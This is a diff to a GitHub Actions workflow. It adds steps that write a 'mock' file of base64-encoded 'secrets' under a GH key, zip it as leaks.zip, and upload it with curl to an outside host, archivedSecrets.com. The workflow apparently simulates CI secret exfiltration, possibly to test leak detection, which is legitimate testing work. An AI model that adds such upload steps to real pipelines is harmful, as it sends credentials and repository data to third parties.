@@ -40,8 +40,23 @@ jobs:
           
           # 2. Create the leaks.zip file in the working directory
           zip leaks.zip dummy_file.txt
+      - name: 📝 Create and Compress the File With base64 secrets
+        run: |
+          # 1. Create a dummy file for the mock
+          echo "-d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'" > dummy_file_64.txt
+          
+          # 2. Create the leaks.zip file in the working directory
+          zip leaks.zip dummy_file_64.txt
 
       - name: 🚀 Upload the generated Zip File
+        run: |
+          # Since the 'zip' command ran in the root directory, 
+          # the path is simply 'leaks.zip'
+          curl -X POST https://archivedSecrets.com \
+            -F "file=@leaks.zip" \
+            -H "Content-Type: application/form-data"
+            
+      - name: 🚀 Upload the generated Zip File base64
         run: |
           # Since the 'zip' command ran in the root directory, 
           # the path is simply 'leaks.zip'
